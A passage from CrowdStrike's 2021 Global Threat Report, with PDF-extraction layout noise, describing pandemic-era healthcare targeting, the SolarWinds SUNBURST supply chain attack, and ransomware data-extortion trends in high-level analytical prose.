It was a year of hardship and grief for many, as well as\n\ntumultuous social and economic change on a global scale. For most of\n\n###### This annual report\n\nus in the business of stopping breaches and protecting organizations\n\n## E\n\n###### offers important lessons from cyberattacks, it was also perhaps the most active year in memory. and recommendations\n\nThe onslaught was unrelenting, and for some organizations, overwhelming. As stay\n###### for security teams at-home orders rippled around the world, we saw office blocks turn into ghost towns operating in today’s virtually overnight. Millions of workers retreated to hastily equipped home offices,\n\ncreating a feeding frenzy for cyber predators spurred on by the windfall of easy\n\n###### environment, where access to sensitive data and networks. At the same time, fear, concern and curiosity visibility and speed are surrounding COVID-19 provided the perfect cover for a record-setting increase in\n\nsocial engineering attacks from both eCrime actors and targeted intrusion adversaries.\n\n###### more critical than ever.\n\nAs the saying goes, “the devil is in the details,” and in many ways, that sums up this\nyear’s Global Threat Report. The details revealed in these pages are derived from\nfirsthand observations of our frontline cyber responders and analysts, coupled with\ninsights drawn directly from the unprecedented volume of crowdsourced threat\ntelemetry we continuously collect and dissect on behalf of our customers.\n\nAmong the details you’ll learn in this report:\n\n\u0007How state-sponsored adversaries infiltrated networks to steal valuable data on\nvaccine research and government responses to the pandemic\n\n\u0007How criminal adversaries introduced new business models to expand their “big\ngame hunting” ransomware activities — and made them even more potent with\nthe addition of blackmail and extortion techniques\n\n\u0007How both eCrime and targeted intrusion adversaries stepped up their\ndevelopment efforts, deploying a variety of inventive new methods to evade\ndetection and confound defenders\n\nOur annual report also offers some important lessons and recommendations for\nsecurity teams operating in today’s environment. As threat actors add new tools,\ntechniques and procedures to their arsenals, and form new alliances to bolster their\nstrength and extend their reach, visibility and speed are more critical than ever.\nSecurity teams must become more versatile, more proactive and more productive to\nstay ahead of threats.\n\nCrowdStrike is committed to helping you achieve and maintain an advantage over\nadversaries. We’re working hard to help you secure your cloud environments, just\nas you would on-premises systems. We’re providing better ways for you to identify\nand proactively address potential vulnerabilities before they can be leveraged by\nattackers. We’re helping you protect identities and access, including new Zero Trust\n\n\n-----\n\ncapabilities to compartmentalize your operations, restrict data access and reduce\nrisk to your most sensitive information. These are just a few of the ways we are\npushing the envelope, expanding our protection capabilities so we can enhance and\nempower yours.\n\nWe spent much of 2020 hoping that its unique challenges would quickly be\nconsigned to history. Let’s hold onto that hope, but at the same time, we need to stay\nclear-eyed and resolute about the hurdles that lie ahead. I hope this report on recent\nglobal threat activity and trends helps you become better informed and better able\nto meet those challenges, so when we finally put this chapter of history behind us,\nwe’ll be able to look back and reflect on not just our losses, but also a few victories.\n\n**George Kurtz**\nCrowdStrike CEO and Co-Founder\n\n\n-----\n\n###### Table of Contents\n\n\n###### 6\n 6 8\n\n 9\n\n 11\n 11\n\n 16\n\n 19\n\n 24\n 25 28\n\n 30\n\n 34\n 35 39 41 44 47\n\n 48\n 48 48\n\n 50\n\n 52\n\n 52\n\n\n###### Introduction Introducing the eCrime Index Naming Conventions\n\n Threat Hunting Overview\n\n 2020 Trends Global Pandemic Brings COVID-19 Themes and Healthcare Sector Targeting StellarParticle Conducts Supply Chain Attack and Abuses O365 Big Game Hunters Adopt Data Extortion Methods\n\n eCrime Ecosystem Trends and Techniques OverWatch Feature: WIZARD SPIDER Targets Financial Institution eCrime Enablers\n\n Targeted Intrusions China Russia Iran N.

Healthcare sector\nentities continue to fight the COVID-19 pandemic that, beyond the tragic\nhuman toll of the disease, fueled numerous incidents of malicious cyber\n\n## A\n\nactivity. The ransomware adversaries that proliferated in 2020 are as motivated as\never, evidenced by the introduction of increasingly damaging tactics, techniques and\nprocedures (TTPs). Finally, as 2020 came to a close, a major supply chain software\nattack racked the U.S. public sector and adjacent industries.\n\nTWISTED SPIDER’s adoption of data extortion tactics was singled out in early\n2020 as a direction other eCrime actors might pursue to capitalize on ransomware\ninfections — a preview of what would become, without exaggeration, an explosion\nof similar activity throughout the year. The allure of big game hunting (BGH) —\nransomware campaigns aimed at high-value targets — dominated the ecosystem\nof eCrime enablers in 2020, spurring the market for network access brokers. BGH\ntrends also disrupted traditional targeted eCrime behavior — as seen by threat\nactor CARBON SPIDER’s shift away from the targeting point-of-sale (POS) systems\nto join the BGH ranks. WIZARD SPIDER — a BGH actor and established eCrime\n“megacorp” — sustained their high-tempo operations to become the most reported\neCrime adversary for the second year in a row.\n\nNot even the global pandemic could slow the pace of targeted intrusions in 2020,\nnor could the large number of public disclosures regarding adversary activity in both\n2019 and 2020. In continuation of a trend highlighted in 2019, Chinese adversaries\ntargeted telecommunications, with WICKED PANDA having another prolific year,\ndespite indictments against individuals associated with their operations. As\nexpected, Democratic People's Republic of Korea (DPRK) adversaries sustained\ntheir currency-generation efforts. Interestingly, the blending of eCrime and targeted\nintrusion tactics previously associated with these North Korean actors and some\nRussian adversaries was also observed from Iran-nexus PIONEER KITTEN.\n\nTo tackle these threats, CrowdStrike Intelligence has offered an unparalleled level\nof coverage, adding 19 named adversaries to bring the total of tracked actors\nacross the globe to 149. In instances where CrowdStrike Intelligence lacks sufficient\ninformation or evidence to assign an adversary name, targeted intrusion activity\nis tracked as a “cluster.” In 2020, the number of tracked activity clusters under\ncontinued monitoring rose to 24.\n\n###### Introducing the eCrime Index\n\nThe eCrime ecosystem is an active and diffuse economy of financially motivated\nentities that engage in myriad criminal activities in order to generate revenue. The\nmarket dynamics as observed by the CrowdStrike Intelligence team over the past\nseveral years are fluid; as new mechanisms and schemes are devised to generate\nrevenue, new avenues of monetization are identified, and as the global geopolitical and\n\n\n-----\n\neconomic landscape changes, adversaries evolve their tactics to maximize profits. This\nunderground economy parallels global markets in many ways. In order to understand the\nebbs and flows of this ecosystem, CrowdStrike has devised a computed value to assess\nthe state of eCrime. The eCrime Index (ECX) is based on various observables, weighted\nby impact, that are continuously monitored by CrowdStrike subject matter experts.\nThe ECX helps identify notable changes that can then be further investigated. Analysis\nresults of such events and the continuous tracker to monitor changes will be shared on\n[the Adversary Universe website.](http://adversary.crowdstrike.com/)\n\n###### eCRIME INDEX, FEB. 22, 2021\n\n\n400\n\n300\n\n\n200\n\n100\n\n\n0\n\n\n###### 328.36 ↑ [123.97% ECX]\n\nECrime Index Upper Bound\n\n\nEcrime Index Value\n\nECrime Index Lower Bound\n\n\n-----\n\n###### Naming Conventions\n\nThis report follows the naming conventions instituted by CrowdStrike to categorize\nadversaries according to their nation-state affiliations or motivations. The following\nis a guide to these adversary naming conventions.\n\n|Adversary BEAR|Nation-State or Category RUSSIA|\n|---|---|\n|BUFFALO|VIETNAM|\n|CHOLLIMA|DPRK (NORTH KOREA)|\n|CRANE|ROK (REPUBLIC OF KOREA)|\n|JACKAL|HACKTIVIST|\n|KITTEN|IRAN|\n|LEOPARD|PAKISTAN|\n|LYNX|GEORGIA|\n|PANDA|PEOPLE’S REPUBLIC OF CHINA|\n|SPIDER|ECRIME|\n|TIGER|INDIA|\n\n\n-----\n\n###### Threat Hunting Overview\n\nhe CrowdStrike Falcon OverWatch™ managed threat hunting team\ncontinues to observe major increases in interactive intrusion activity,\nas illustrated in Figure 1. In just two years, there has been a fourfold\nincrease in the number of interactive intrusions — those involving the\n\n## T\n\nuse of hands-on-keyboard techniques — uncovered by OverWatch.\n\n###### INTERACTIVE INTRUSION ACTIVITY OVER TIME\n\n450%\n\n400%\n\n350%\n\n300%\n\n250%\n\n200%\n\n150%\n\n100%\n\n50%\n\n0%\n\n\nQ1\n2019\n\n\nQ2 Q3 Q4 Q1 Q2 Q3 Q4\n2019 2019 2019 2020 2020 2020 2020\n\n\nTargeted\n\n\nUnattributed eCrime\n\n\n**Figure 1. Quarterly Growth in Interactive Intrusion Campaigns by Threat Type, Q1 2019**\nto Q4 2020\n\n\n-----\n\nThe growth in intrusion numbers has been driven in large part by the proliferation\nof eCrime activity. As shown in Figure 2, eCrime intrusions made up 79% of all\nattributable intrusions uncovered by OverWatch in 2020.\n\n###### INTERACTIVE INTRUSION CAMPAIGNS BY THREAT TYPE 2019 VS. 2020\n\n ↗ ↗ 79%\n 69%\n 2020 2019\n 21% 31%\n ↘ ↘\n\n\n###### ↗\n 79%\n 2020\n 21%\n ↘\n\n\n###### 69%\n 2019\n 31%\n ↘\n\n\nTargeted eCrime\n\n**Figure 2. Relative Frequency of Targeted and eCrime Intrusions Uncovered by OverWatch, 2019**\nvs. 2020\n\nWith nearly four out of five interactive intrusions uncovered in 2020 being driven\nby eCrime actors, it’s imperative that these adversary groups, and methods for\ndefending against their TTPs, deserve a great deal of attention in the coming year.\nHowever, targeted intrusions driven by state-sponsored groups should not be\nneglected. While the relative slice of pie representing targeted intrusions shrank\nin 2020 compared to 2019, it should be noted that the overall numbers of both\ntargeted and eCrime intrusions are significantly larger than in 2019. OverWatch’s\nobservations show that nation-state adversaries are not letting up and continue to\nmerit strong consideration in 2021.\n\n\n###### ↗\n 69%\n 2019\n 31%\n ↘\n\n\n-----\n\n###### 2020 Trends Global Pandemic Brings COVID-19 Themes and Healthcare Sector Targeting\n\nn January 2020, medical and government personnel sought to understand\nthe nature and potential threat of COVID-19, which had broken out in China’s\nHubei province. Within weeks, the virus migrated beyond China to the rest of\nAsia, Europe, North America and the Middle East. By March, unprecedented\n\n## I\n\nstay-at-home orders were put into effect around the world to slow the spread of the\ndisease. Concern over the growing threat of the pandemic made for valuable subject\nmatter for criminal and targeted intrusion adversaries, who used COVID-19 themes in\nphishing campaigns and lures. CrowdStrike Intelligence also identified both eCrime\nand targeted intrusion adversaries specifically attacking the healthcare sector\nthroughout the pandemic.\n\n###### Targeted Intrusions\n\nIn the early days of the pandemic, objectives for targeted intrusion actors may have\nincluded acquiring information on infection rates or country-level responses to the\ntreatment of COVID-19. However, as the pandemic accelerated, governments were\nfaced with daunting infection rates, mounting deaths and overburdened hospitals.\nThe search for a vaccine became of paramount importance, and the scientific\ninformation that could lead to a vaccine for COVID-19 was a high-priority collection\nrequirement for many targeted intrusion adversaries.\n\n\n###### ↘\n\n CrowdStrike Intelligence identified both eCrime and targeted intrusion adversaries specifically attacking the healthcare sector throughout the pandemic.\n\n\n-----\n\n|Actor North Korea: LABYRINTH CHOLLIMA|Used COVID-19 Themes in Lures|Targeted Healthcare Sector|Targeted Government Response|\n|---|---|---|---|\n|North Korea: SILENT CHOLLIMA||||\n|North Korea: VELVET CHOLLIMA||||\n|Vietnam: OCEAN BUFFALO||||\n|Iran: CHARMING KITTEN||||\n|Iran: STATIC KITTEN||||\n|Russia: COZY BEAR (reported in open sources)||||\n|China: PIRATE PANDA|||(suspected)|\n|China: RegionalWave activity cluster||||\n\n\n**Table 1. Summary of Significant Targeted Intrusion Activity Potentially Related to the COVID-19**\nPandemic\n\n###### NORTH KOREA\n\nWhile VELVET CHOLLIMA and LABYRINTH CHOLLIMA began distributing COVID19-themed lure documents in April 2020, this type of decoy content did not initially\nindicate healthcare sector targeting and instead was aimed at foreign policy officials.\nHowever, in September 2020, Falcon OverWatch detected SILENT CHOLLIMA in\nthe environment of an Asian pharmaceutical sector organization. One month later,\nCrowdStrike Intelligence discovered phishing domains linked to VELVET CHOLLIMA\nthat appear to spoof U.K., U.S. and South Korean pharmaceutical companies leading\nefforts on COVID-19 research. Concurrent with VELVET CHOLLIMA’s phishing\nactivity, OverWatch detected LABYRINTH CHOLLIMA attempting to infiltrate a U.S.based healthcare provider, and it was subsequently reported in open sources that\nLABYRINTH CHOLLIMA likely targeted several pharmaceutical companies involved\nwith COVID-19 vaccine production.\n\n\n-----\n\n###### VIETNAM\n\nCrowdStrike Intelligence identified a significant temporal overlap between Vietnambased OCEAN BUFFALO’s early January 2020 targeting of Chinese private and\ngovernment institutions playing critical roles in combating COVID-19, and the\nVietnamese government’s very early and robust response in enacting sweeping\nmeasures to prevent the virus’s spread into the country. The severity and breadth of\nVietnam’s measures stood out, as they began weeks before the first confirmed cases\nof COVID-19 in Vietnam and at a time when only two deaths had occurred in China.\n\n###### IRAN\n\nDuring early December 2020, CrowdStrike Intelligence identified STATIC KITTEN\ntargeting a government entity located in the Middle East and North Africa (MENA)\nregion. The activity consisted of credential collection via a known variant of Mimikatz,\nlateral movement, and the probable staging of documents related to COVID-19 for\nexfiltration. The healthcare sector has been a target of STATIC KITTEN since January\n2020, suggesting that the adversary’s priorities in 2020 included an expanded focus\non health-related topics even prior to the outbreak of COVID-19.\n\n###### RUSSIA\n\nIn July 2020, the U.S., U.K. and Canadian governments released information describing\na COZY BEAR campaign that targeted COVID-19 research facilities. This campaign\nwas reportedly conducted throughout 2020 and was likely intended to steal\ninformation relating to the development and testing of vaccines targeting the virus.\n\n###### CHINA\n\nIn July 2020, the U.S. Department of Justice (DOJ) indicted two Chinese nationals\nwith alleged ties to the Chinese Ministry of State Security (MSS) for wide-ranging\ncyber operations, the most recent of which reportedly included targeting U.S.based COVID-19 research centers. Intelligence officials in Spain also claimed that a\nChina-nexus actor had successfully stolen information relating to COVID-19 vaccine\ndevelopment from Spanish research institutes in September 2020. In addition to\nthis reported activity, CrowdStrike identified five suspected China-origin campaigns\ntargeting healthcare entities in 2020.\n\n###### eCrime\n\n BGH TARGETING HEALTHCARE SECTOR\n\nEven under normal operating conditions, the healthcare vertical faces a significant\nthreat from criminal groups deploying ransomware, the consequences of which\ncan include the disruption of critical care facilities. Along with the possibility of\nsignificant disruption to critical functions, victims face a secondary threat from\nransomware operations that exfiltrate data prior to the execution of the ransomware,\na trend observed across all sectors throughout 2020 (see the section “Big Game\nHunters Adopt Data Extortion Methods”).\n\n\n-----\n\n###### ↘\n\n\n###### WIZARD SPIDER actively targeted the healthcare sector in Q4 2019, and the rise of Ryuk infections in October 2020 demonstrated a repetition in targeting preferences.\n\n Similarly, this adversary focused on the academic sector during September- October 2019 and again in 2020 as students were returning to school following summer vacation.\n\n\n###### These trends indicate a degree of planning by WIZARD SPIDER to target certain verticals at times of the year when ransomware campaigns would have the most significant impact.\n\n Even in a non-pandemic year, Q4 targeting of the healthcare sector would coincide with the start of the cold and flu season.\n\n\nAmid the pandemic, the healthcare sector proved to be a controversial target among\nBGH operators. Some adversaries — including TWISTED SPIDER, VIKING SPIDER,\nGRACEFUL SPIDER and TRAVELING SPIDER — publicly announced intentions to\navoid targeting frontline healthcare entities. Others, including DOPPEL SPIDER,\nsaid that any unintentional infections against a healthcare provider would be quickly\nresolved by providing decryption keys without requiring payment. An incident\naffecting a Germany-based hospital triggered such a response in September\n2020. Despite these assertions, CrowdStrike Intelligence confirmed that 18 BGH\nransomware families infected 104 healthcare organizations in 2020, with the most\nprolific being TWISTED SPIDER using Maze, and WIZARD SPIDER using Conti. In\nsome cases, adversaries may have avoided targeting hospitals, but proceeded with\nattacks against pharmaceutical and biomedical companies.\n\nAs depicted in Figure 3, TWISTED SPIDER achieved at least 26 infections at\nhealthcare sector victims with their Maze and Egregor ransomware families,\npredominantly at U.S.-based entities. WIZARD SPIDER conducted 25 attacks\nagainst the healthcare industry with both Conti and Ryuk. Throughout October\n2020, Ryuk was heavily attributed to a large number of infections against U.S.-based\nhealthcare entities, a surge that occurred despite a concerted disruption effort by\ncybersecurity vendors in September 2020. This surge also prompted a response by\nlaw enforcement on Oct. 28, 2020, when the U.S. Federal Bureau of Investigation\n(FBI) issued an alert warning of attacks involving WIZARD SPIDER’s TrickBot leading\nto ransomware infections and disruption to healthcare services.\n\n\n###### HEALTHCARE VICTIMS BY RANSOMWARE FAMILY IN 2020\n\n ↙ Infection Count\n\n\n25\n\n20\n\n\n15\n\n10\n\n\n5\n\n0\n\n\n###### ↖\n\n\nRansomware Family\n\n\n**Figure 3. Confirmed Healthcare Sector Victim Count by Ransomware Family in 2020**\n\n\n-----\n\n###### TRENDS IN ECRIME PHISHING THEMES\n\nSocial engineering techniques are frequently used by criminally motivated threat\nactors to tailor phishing campaigns, malspam emails and fraudulent scams. The\npsychology behind many of these techniques is to prey on human emotions and\nbehavior, the most exploitable of which are greed, curiosity, fear and the desire to\nhelp. The COVID-19 pandemic provided criminal actors with a unique opportunity to\nuse lure content and social engineering techniques capable of targeting each of these\ncomponents of human behavior. As a topic, COVID-19 has global impact, 24-hour news\ncoverage and as of this writing, no clear end in sight.\n\nPandemic-Related eCrime Phishing Themes\n\nExploitation of individuals looking for details on disease tracking, testing and treatment\n\nImpersonation of medical bodies, including the World Health Organization (WHO) and U.S.\nCenters for Disease Control and Prevention (CDC)\n\nFinancial assistance and government stimulus packages\n\nTailored attacks against employees working from home\n\nScams offering personal protective equipment (PPE)\n\nPassing mention of COVID-19 within previously used phishing lure content (e.g., deliveries,\ninvoices and purchase orders)\n\n**Table 2. eCrime Phishing Themes Referencing COVID-19**\n\nLike pre-pandemic phishing campaigns, these attacks attempted to encourage a\nhuman response — either to interact with a hyperlink or attachment to an email, or\nto attract visitor traffic via online searches. By the summer of 2020, criminal actors\nbegan to return to previously popular lure content, albeit with some references to\nCOVID-19 added.\n\n###### Outlook\n\nCOVID-19 has significantly impacted economic, social, religious, business and political\nspheres. The numerous targeted intrusion operations against healthcare sector\nentities underscore the value that vaccine-related intellectual property had in 2020\nand going forward. With the recent authorization and release of vaccines, vaccination\nrollout plans will likely become a target of intelligence-gathering efforts by statesponsored adversaries in 2021. Variations on COVID-19 themes arising this year will\nlikely include lure content referencing vaccinations or new variants of the disease.\n\n\n-----\n\n###### StellarParticle Conducts Supply Chain Attack and Abuses O365\n\nn Dec. 13, 2020, public reporting revealed details of a sophisticated\nsupply chain attack against the update deployment mechanism\n\nTargeted Industries\n\nof the SolarWinds Orion IT management software. The adversary\nresponsible used this operation to distribute and install malicious\n\n## O\n\ncode, dubbed SUNBURST. Because of the nature of this initial intrusion vector,\n\nEducation\n\ndeployments of malicious code have been observed and reported by a large number\nof organizations spread across multiple verticals worldwide.\n\nGovernment\n\n###### Initial Access and Exploitation\n\nAnalysis of a virtual machine used in the software build provided insight into the\n\nTechnology\n\nway the build process was hijacked by the adversary — tracked by CrowdStrike as\nthe StellarParticle activity cluster. StellarParticle installed a monitoring tool tracked\nby CrowdStrike Intelligence as SUNSPOT, which detects the beginning of the\n\nEnergy\n\nOrion packages build and replaces one of the source code files with a backdoored\nversion containing both an execution path inserted in the legitimate Orion code,\nand SUNBURST’s source code. The design of SUNSPOT suggests StellarParticle\n\nHealthcare\n\ndevelopers invested significant efforts into ensuring the tampering process worked\nproperly, and added strong conditions to avoid revealing their presence in the build\nenvironment to SolarWinds developers.\n\nOnce installed, SUNBURST has the ability to collect information about the host,\nenumerate files and services on the system, make HTTP requests to arbitrary URLs,\nwrite/delete/execute arbitrary files, modify registry keys, terminate processes and\nreboot the system. These capabilities enable StellarParticle to verify whether a\nvictim host is of further interest prior to the deployment of additional malicious code.\nAnalysis of this activity indicates the distribution of the backdoored updates of\nSolarWinds Orion likely started on or around March 24, 2020.\n\n_SUNBURST hides in plain sight by using source code naming conventions similar to_\nthose of SolarWinds’ developers, as well as by using two different communication\nchannels for command and control (C2), based on DNS requests camouflaging as\nAmazon Web Services (AWS) traffic and on HTTP requests with the same structure\nas SolarWinds’ Orion Improvement Program (OIP) telemetry traffic. Strong execution\nguardrails were added to the backdoor to evade detection with various techniques,\nwhich in particular include tampering with security software services in order to\ndisable them.\n\n|Col1|Education|\n|---|---|\n||Government|\n||Technology|\n||Energy|\n||Healthcare|\n\n\n-----\n\n###### Post-Exploitation\n\nAlthough the SUNBURST C2 infrastructure ceased to operate on or around Oct. 6,\n2020, post-exploitation of the initial access obtained using the backdoor continued\ninto December 2020 and may still be ongoing. Industry reporting identified postexploitation actions associated with this activity that include the deployment of nextstage tooling, such as TEARDROP and Cobalt Strike, through SUNBURST, as well\nas hands-on-keyboard activity using PowerShell to interact with various enterprise\nnetwork services. Targeting of internal services includes a reported interest in Active\nDirectory (AD) credential compromise, email collection and cloud infrastructure\nlateral movement.\n\nAnalysis of the backdoor suggests that only a subset of the victims that experienced\n_SUNBURST infections actually received post-exploitation tasking from StellarParticle_\noperators, although the exact scope selected by the adversary remains unclear.\n\nPandemic-Related eCrime Phishing Themes\n\n[Initial test modifications to Orion code base, as reported by](https://orangematter.solarwinds.com/2021/01/11/new-findings-from-our-investigation-of-sunburst/)\nSeptember 2019\n[SolarWinds](https://orangematter.solarwinds.com/2021/01/11/new-findings-from-our-investigation-of-sunburst/)\n\nDec. 6, 2019 Beacon C2 domain registered\n\nFeb. 27, 2020 Beacon C2 domain first resolves to an IP address\n\nSSL certificate first associated with a known secondary C2\nMarch 3, 2020\ndomain\n\nCompile time of first known malicious update containing\nMarch 24, 2020\n_SUNBURST code_\n\nMarch 31, 2020 First known date of malicious update distribution\n\n**Table 3. Timeline of Supply Chain Attack**\n\n###### Infrastructure\n\nThe StellarParticle adversary took noticeable steps to avoid common operational\nsecurity (OPSEC) mistakes in the process of registering and managing\ninfrastructure. The only technical overlap between all of the known domains was the\npurchase of SSL certificates issued by commercial certificate authority Sectigo, but\nthis is too widely used to aid with analytical pivots. There is no IP address overlap\nbetween domains, as each is hosted on separate cloud or VPS infrastructure.\nAdditionally, the actor used multiple registrars and hosting services for the domains\nand servers. The adversary did not register domains in bulk, preferring to buy old\nand comparatively expensive domains, likely to obtain more reputable infrastructure.\n\n|September 2019|Initial test modifications to Orion code base, as reported by SolarWinds|\n|---|---|\n|Dec. 6, 2019|Beacon C2 domain registered|\n|Feb. 27, 2020|Beacon C2 domain first resolves to an IP address|\n|March 3, 2020|SSL certificate first associated with a known secondary C2 domain|\n|March 24, 2020|Compile time of first known malicious update containing SUNBURST code|\n|March 31, 2020|First known date of malicious update distribution|\n\n\n-----\n\n###### Abuse of O365\n\nIn addition to the deployment of the SUNBURST backdoor, the StellarParticle actors\ndemonstrated exceptional knowledge of Microsoft O365 and the Azure environment.\nOther victims of this intrusion have since come forward who have reported that\nO365 was a consistent target of the adversary. In CrowdStrike’s own experience, it\nwas determined this adversary successfully targeted a Microsoft Reseller and used\ndelegated access meant to allow the reseller to audit licenses to abuse O365 Oauth\napplications to unsuccessfully target email. StellarParticle’s comfort and capabilities\nin abusing Azure and O365 demonstrate they have a detailed understanding of the\nauthentication and access controls associated with those platforms.\n\n###### Attribution\n\nPublic reports have suggested an attribution of the StellarParticle activity cluster\nto the Russian Foreign Intelligence Service of the Russian Federation (SVR), an\norganization associated by CrowdStrike Intelligence to COZY BEAR. However, as of\nFebruary 2021, CrowdStrike Intelligence does not attribute StellarParticle activity to\na named adversary or geographic nexus.\n\nStellarParticle Activity Cluster\n\n**Motivation** Espionage Likely state-sponsored\n\n_SUNBURST_ Reconnaissance and first-stage loader malware\n\nMonitoring tool that detects the beginning of an Orion\n\n**Toolkit** _SUNSPOT_ package build and replaces one of the source code\n\nfiles with a backdoored version\n\n_TEARDROP_ Custom in-memory loader used to drop Cobalt Strike\n\n**Table 4. StellarParticle Summary**\n\n###### Outlook\n\nSupply chain attacks are nothing new; CrowdStrike publicly raised them as a rising\n[threat as far back as 2018 and believes they will continue to be a major intrusion](https://www.crowdstrike.com/press-releases/supply-chain-attacks-on-the-rise-as-one-of-the-biggest-new-threat-vectors-as-organizations-scramble-to-close-gaps/)\nvector. Supply chain attacks represent a unique initial access tactic that provides\nmalicious actors with the ability to propagate from a single intrusion to multiple\ndownstream targets of interest. In addition to software-based attacks, such as the\none that affected SolarWinds, supply chain attacks can take the form of hardware\nor third-party compromises. CrowdStrike Intelligence has identified supply chain\nand trusted relationship compromises originating from both eCrime and targeted\nintrusion adversaries. eCrime actors commonly use the access from these\ncompromises for financial gain, generally deploying ransomware and mineware,\nwhereas targeted intrusion adversaries primarily use compromises to deploy\nespionage-driven toolsets to a broad set of users. Given the potential high return on\ninvestment for threat actors, CrowdStrike Intelligence anticipates these attacks will\ncontinue to threaten organizations across all sectors in 2021.\n\n|Motivation|Espionage|Likely state-sponsored|\n|---|---|---|\n|Toolkit|SUNBURST|Reconnaissance and first-stage loader malware|\n||SUNSPOT|Monitoring tool that detects the beginning of an Orion package build and replaces one of the source code files with a backdoored version|\n||TEARDROP|Custom in-memory loader used to drop Cobalt Strike|\n\n\n-----\n\n###### Big Game Hunters Adopt Data Extortion Methods\n\nince the original BGH adversary — BOSS SPIDER — was identified in\nJanuary 2016, CrowdStrike Intelligence has observed both established\ncriminal actors (e.g., INDRIK SPIDER and WIZARD SPIDER) and\nransomware operators adopting and reimagining BGH tactics.\n\n## S\n\nThroughout 2020, BGH continued to be a pervasive threat to companies worldwide\nacross all verticals, with CrowdStrike Intelligence having identified at least 1,377\nunique BGH infections. Notable in 2020 was the growing trend of ransomware\noperators threatening to leak data from victim organizations, and in some cases\nactively doing so. This tactic was highly likely intended to pressure victims to make\npayment, but is also likely in response to improved security practices by companies\nthat could negate encryption of their files by recovering from backups.\n\n\nData extortion is a tried-and-true tactic, and even the act of combining data extortion\nwith a ransomware operation is not new to 2020 — OUTLAW SPIDER first employed\nthis tactic in May 2019. What marks a departure from previous BGH operations is the\naccelerated adoption of the data extortion technique and the introduction of dedicated\nleak sites (DLSs) associated with specific ransomware families. These approaches were\nadopted by at least 23 ransomware operators in 2020.\n\n###### MOST ACTIVE BGH ADVERSARIES WITH DEDICATED LEAK SITES\n\n\n500\n\n450\n\n400\n\n350\n\n300\n\n250\n\n200\n\n150\n\n100\n\n50\n\n\n0\n\n\n###### ↙ Total\n\n**Figure 4.

TWISTED SPIDER became\nthe most adept at this technique, spacing out releases in percentages of the total\nexfiltrated dataset. Other adversaries using the percentage release method include\nWIZARD SPIDER with Conti victims, and the operators of MountLocker ransomware.\nAn alternative approach is to release the datasets in numbered “parts,” a technique\npreferred by RIDDLE SPIDER and VIKING SPIDER, both of which seemingly choose\nthe release date manually. CARBON SPIDER developed an automated system that\ndisplays a predetermined publication time set by an automated countdown timer.\n\nLess commonly observed is the release of data by type, where the adversary creates\ndatasets for personally identifiable information (PII), financial records, sensitive\ncompany data, and information pertaining to partners and customers, and then\nreleases these datasets at separate intervals. For some victims with higher brand\nrecognition, each new release can trigger renewed reporting on the incident across\nsocial media platforms or by news outlets. VIKING SPIDER has adopted this approach\nwith some victims, as have affiliates of PINCHY SPIDER for a small number of REvil\nvictims. Whichever release method is chosen by the adversary, the intent is almost\ncertainly to increase pressure on the victim company to pay the ransom.\n\n###### Targeting\n\nAlthough most ransomware operations are opportunistic, CrowdStrike Intelligence\nidentified the highest number of ransomware-associated data extortion operations\nthis year in the industrial and engineering sector (229 incidents), closely followed by\nthe manufacturing sector (228 incidents). The manufacturing industry is particularly\nvulnerable to ransomware operations. Not only does the industry suffer the normal\nconsequences of a ransomware infection, but a disruption in day-to-day operations\nwould greatly affect the core business if a company were unable to meet production\ndemands due to system outages.\n\n###### ↘\n\n Although most ransomware operations are opportunistic, CrowdStrike Intelligence identified the highest number of ransomware-associated data extortion operations this year in the industrial and engineering sector, closely followed by the manufacturing sector.\n\n\n-----\n\n###### INDUSTRIES AFFECTED BY DATA LEAKS\n\n ↙ Total\n\n\n240\n\n220\n\n\n200\n\n180\n\n\n160\n\n140\n\n\n120\n\n100\n\n\n80\n\n60\n\n\n40\n\n20\n\n\n0\n\n\n###### ↖ Industries\n\n\n**Figure 5. Industries Targeted by Data Extortion Related to BGH Operations**\n\n\n-----\n\n###### TWISTED SPIDER and the Maze Cartel\n\nWhile OUTLAW SPIDER was the first to be observed using data extortion in a\nransomware campaign, TWISTED SPIDER — operators of Maze and Egregor\nransomware — has been credited with being the catalyst for the heavy adoption of this\ntechnique in 2020. TWISTED SPIDER was the first ransomware actor to launch a DLS,\nwhich was created on Dec. 10, 2019. In June 2020, following an explosion of dedicated\nleak sites in the first half of the year, TWISTED SPIDER branded themselves\nthe leader of the “Maze Cartel,” which was a cooperative effort between them,\nVIKING SPIDER, and the operators of LockBit ransomware, as well as unconfirmed\ninvolvement from the operators of SunCrypt and WIZARD SPIDER. The Maze Cartel\nshared leaked data from their operations on each of their DLSs in a likely effort to\nreach a wider audience, thus putting more pressure on victim companies.\n\nTWISTED SPIDER announced the cessation of Maze operations in November 2020,\ndeclaring the Maze Cartel never existed. CrowdStrike Intelligence assesses the group\nhas likely rebranded itself and now deploys Egregor ransomware. This assessment\nis based on code overlap between Maze and Egregor, an influx in Egregor activity\ncoinciding with a decline in Maze infections, and similar tactics and layout of the\nassociated DLS (including leaking victim data in percentage increments).\n\nDespite the demise of Maze, cartels may continue to be created as needed. On\nDec. 22, 2020, a new post made to MountLocker ransomware’s Tor-hosted DLS\nwas titled “Cartel News” and included details of a victim of VIKING SPIDER’s Ragnar\n_Locker. Publicizing each other’s operations will likely contribute to the reputation of_\nBGH operators. If tactics evolve and the adversaries begin to use different hosting\nlocations for each other’s victim data, it could hinder the ability for a victim to\nnegotiate the removal and/or destruction of stolen information, further increasing\nthe risk of it being shared, sold or auctioned to other eCrime actors.\n\n###### Outlook\n\nData theft and the use of a DLS have arguably become as engrained in the BGH\nransomware operation as the encryption process itself. Throughout 2020, the BGH\nlandscape became increasingly postured toward incentivizing the victim to engage\nin ransom negotiations once they have been infected with ransomware. In October\n2020, the operators of SunCrypt ransomware used a distributed denial-of-service\n(DDoS) attack to compel a victim to pay a ransom, introducing a new variation of\nthe strong-arm tactics that BGH adversaries became known for in 2020. Denial of\naccess to mission-critical resources, as demonstrated by this SunCrypt operation, is\na potentially fruitful avenue for BGH actors to expand upon.\n\n\n-----\n\n###### eCrime Ecosystem\n\nhe eCrime ecosystem remains vast and interconnected, with many\ncriminal enterprises existing to support big game hunting operations.\nNotable to 2020 is the pivotal role access brokers play in the eCrime\necosystem, supporting a variety of actors to include BGH ransomware\n\n## T\n\noperators. LUNAR SPIDER and MALLARD SPIDER have also been observed using\ntheir capabilities to adopt this role as well.\n\nThroughout 2020, CrowdStrike Intelligence observed a number of dramatic\nchanges for targeted eCrime actors. CARBON SPIDER shifted away from\npoint-of-sale (POS) campaigns in favor of BGH, ultimately introducing their own\nransomware, DarkSide. Established eCrime actors like MUMMY SPIDER, WIZARD\nSPIDER and CARBON 